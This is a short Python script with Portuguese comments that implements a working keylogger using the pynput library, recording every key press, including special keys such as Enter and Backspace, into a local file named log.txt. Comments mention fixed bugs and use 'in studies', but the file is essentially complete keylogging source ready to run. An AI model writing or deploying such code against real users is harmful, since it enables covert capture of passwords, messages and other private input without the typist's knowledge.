import os
from pynput import keyboard

# Conjunto de teclas de controle que não geram texto legível direta ou utilmente
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.alt_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}


def on_press(key):
    try:
        # Tenta capturar caracteres normais (letras, números, símbolos)
        # Corrigido: adicionadas aspas em "log.txt"
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
            
    except AttributeError:
        # Se cair aqui, significa que é uma tecla especial (Espaço, Enter, etc.)
        # Corrigido: 'utf-9' alterado para 'utf-8' e toda a indentação alinhada
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                # Comum em estudos para indicar que o usuário apagou algo
                f.write("[BACKSPACE]") 
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                f.write(f" [{key.name}] ")


# Bloco principal de execução (Corrigida a indentação para ficar fora das funções)
if __name__ == "__main__": 
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()